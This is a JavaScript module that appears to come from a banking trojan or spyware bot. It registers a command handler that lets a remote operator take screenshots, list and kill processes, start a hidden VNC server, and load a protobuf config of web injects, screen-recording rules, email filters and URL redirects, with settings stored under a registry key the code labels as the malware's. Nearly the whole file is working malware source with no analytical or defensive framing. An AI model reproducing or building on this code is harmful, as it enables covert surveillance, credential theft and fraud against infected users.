var fs = require('fs');
var path = require('path');
var zlib = require('zlib');
var net = require('net');
var stream = require('stream');
var util = require('util');
var suspend = require('suspend');
var spyware = process.binding("spyware");
var reg = process.binding("registry");
var config_processor = require("config_processor");
var protobuf = require('protocol_buffers')

var messages = protobuf(
    'message RedirectionEntry\r\n{\r\noptional string name = 1;\r\noptional string uri = 2;\r\noptional string keyword = 3;\r\noptional string uripassword = 4;\r\noptional string datapassword = 5;\r\n}' +
    'message ProcessModule {\r\n\toptional string szExePath = 1;\r\n\toptional uint32 GlblcntUsage = 2;\r\n\toptional uint64 hModule = 3;\r\n\toptional uint64 modBaseAddr = 4;\r\n\toptional uint64 modBaseSize = 5;\r\n\toptional uint32 ProccntUsage = 6;\r\n\toptional uint32 pcPriClassBase = 7;\r\n\toptional uint32 dwFlags = 8;\r\n\toptional string szModule = 9;\r\n\toptional uint32 th32ModuleID = 10;\r\n\toptional uint32 th32ProcessID = 11;\r\n}\r\n\r\n' + 
    'message Process {\r\n\toptional string szExeFile = 1;\r\n\toptional uint32 cntUsage = 2;\r\n\toptional uint32 th32ProcessID = 3;\r\n\toptional uint32 th32ModuleID = 4;\r\n\toptional uint32 cntThreads = 5;\r\n\toptional uint32 th32ParentProcessID = 6;\r\n\toptional uint32 pcPriClassBase = 7;\r\n\toptional uint32 dwFlags = 8;\r\n\toptional bool\towned = 9;\r\n\trepeated ProcessModule modules = 10;\r\n}\r\n\r\nmessage ProcessList {\r\n \trepeated Process Processes = 1;\r\n}\r\n\r\n' + 
    'message BaseEntryBlock \r\n{\r\n\trepeated string url = 1;\r\n\toptional bool enabled = 2 [default = true];\r\n\trepeated string guids = 3;\r\n\toptional bool filt_get = 4 [default = true];\r\n\toptional bool filt_post = 5 [default = true]; \r\n}\r\n\r\n\r\n' + 
    'message SpywareConfigEntry\r\n{\r\n\trequired BaseEntryBlock base = 1;\r\n\r\n\toptional string data_before = 2;\r\n\toptional string data_inject = 3;\r\n\toptional string data_after = 4;\r\nrepeated string stoplist = 5;\r\n}\r\n\r\n' + 
    'message VideoConfigEntry\r\n{\r\n\trequired BaseEntryBlock base = 1;\r\n\r\n\toptional bool grayScale = 2 [default = true];\r\n\toptional int32 framerate = 3 [default = 5];\r\n\toptional int32 seconds = 4 [default = 30];\r\n\toptional string filenameMask = 5;\r\n\toptional bool uploadAfterRecord = 6 [default = true];\r\n\toptional string hashkey = 7;\r\n}\r\n\r\n\r\n' + 
    'message FragmentConfigEntry\r\n{\r\n    required BaseEntryBlock base = 1;\r\n\r\n    optional string data_before = 2;\r\n    optional string data_after = 3;\r\n}\r\n\r\n' + 
    'message MailFilterEntry \r\n{\r\n\toptional string from = 1;\r\n\toptional string to = 2;\r\n\toptional string subject = 3;\r\n\toptional string body = 4;\r\n}\r\n\r\n\r\n' + 
    'message SpywareConfig \r\n{\r\n repeated SpywareConfigEntry injects = 1;\r\n    repeated VideoConfigEntry recorders = 2;\r\n\trepeated FragmentConfigEntry fragmets = 3;\r\n\trepeated MailFilterEntry emailfilter = 4;\r\nrepeated RedirectionEntry redirects = 5;\r\n}'
);

const SP_SCREENSHOT = 1;
const SP_PROCESSLIST = 2;
const SP_PROCESKILL = 3;
const SP_SPYWARE_CONFIG = 4;
const SP_START_VNC = 5;

var MyPacketId;

process.protobuf_spyware_messages = messages;

function BuildPacket(requestId, status, data)
{
	var packet;

	if(data){
		packet = new Buffer(
			2  +
			4  +
			1  +
			data.length
		);
	}
	else
	{
		packet = new Buffer(
			2  +
			4  +
			1 
		);
	}
	
	packet.writeUInt16BE(MyPacketId, 0);
	packet.writeUInt32BE(requestId, 2);
	packet.writeUInt8(status, 6);

	if(data)
		data.copy(packet, 7);

	return packet;
}

function IsProcessOwned(pid)
{

	if(pid === process.pid)
	{
		return true;
	}

	if(util.isUndefined(process.slaveServer))
	{
		return false;
	}

	for(let i = 0; i < process.slaveServer.clients.length; i ++)
	{
		if(util.isUndefined(process.slaveServer.clients[i].botSocket.process))
		{
			continue;
		}


		if(process.slaveServer.clients[i].botSocket.process.pid.toString() === pid.toString())
		{
			return true;
		}
	}

}
var OnPacket = suspend(function*(outstream, data) 
{
	
	if(data.length <= 5){
		return;
	}

	var func = data.readUInt8();
	var requestId = data.readUInt32BE(1);

	
	
	

	try
	{
		switch(func)
		{
			case SP_START_VNC : 
				require('spyware').startVncServer();
				outstream.sendProtocolPacket(
					MyPacketId, requestId, 0x00, new Buffer([0x00]));
				break;
			case SP_SCREENSHOT :
				var screen = spyware.SpTakeScreenshot(data.readUInt8(5));

				outstream.sendProtocolPacket(
					MyPacketId, requestId, 0x00, screen);

				break;
			case SP_PROCESSLIST : 

				var processesDump = spyware.SpGetProcessList();
				
				for(let i = 0; i < processesDump.length; i ++)
				{
					if(IsProcessOwned(processesDump[i].th32ProcessID))
					{
						processesDump[i].owned = true;
					}
				}

				if(data.readUInt8(5) === 0)
				{

					for(let i = 0; i < processesDump.length; i ++)
					{
						processesDump[i].modules = [];
					}
				}

				var encodedPacket = messages.ProcessList.encode({
					Processes : processesDump
				});

				outstream.sendProtocolPacket(
					MyPacketId, requestId, 0x00, encodedPacket);

				break;
			case SP_PROCESKILL :
				var pid = data.readUInt32BE(5)

			    try{
			        if(process.kill(pid))
			        {
			            outstream.sendProtocolPacket(MyPacketId, requestId, 0x00);
			        }
			        else
			        {
			            outstream.sendProtocolPacket(MyPacketId, requestId, 0xFF);
			        }

			    }catch(e)
			    {
			        outstream.sendProtocolPacket(MyPacketId, requestId, 0xFF);
			    }

				break;
			case SP_SPYWARE_CONFIG:
				var cfg = data.slice(1);
				process.configBlob = cfg;
				process.g_scfg = messages.SpywareConfig.decode(cfg);
				
				
				
				config_processor.SpSaveConfig(cfg);

				if(process.OnSpConfig)
					process.OnSpConfig(process.g_scfg);

				break;
			default:
				outstream.sendProtocolPacket(
					MyPacketId, requestId, 0xFF);
				break;	
		}

	}
	catch(error)
	{
		console.log(error);
		console.log(error.stack);
		console.log(error.message);
		outstream.sendProtocolPacket(
			MyPacketId, requestId, 0xFE, 
			new Buffer(error.message));
	}

});

exports.register = function (prtocolId, packetParsers, procolPacketBuilders) {
	

	process.g_malwareRegistryPath = "SOFTWARE\\cxsw";
	process.g_malwareRegistryHive = HKEY_CURRENT_USER;
	process.g_SpConfigKey = "{c1e2bc64-8d94-461f-a485-50a7322bfb4a}";

	config_processor.SpLoadConfig();

	MyPacketId = prtocolId;
	
	packetParsers[prtocolId] = OnPacket;
	procolPacketBuilders[prtocolId] = BuildPacket;
}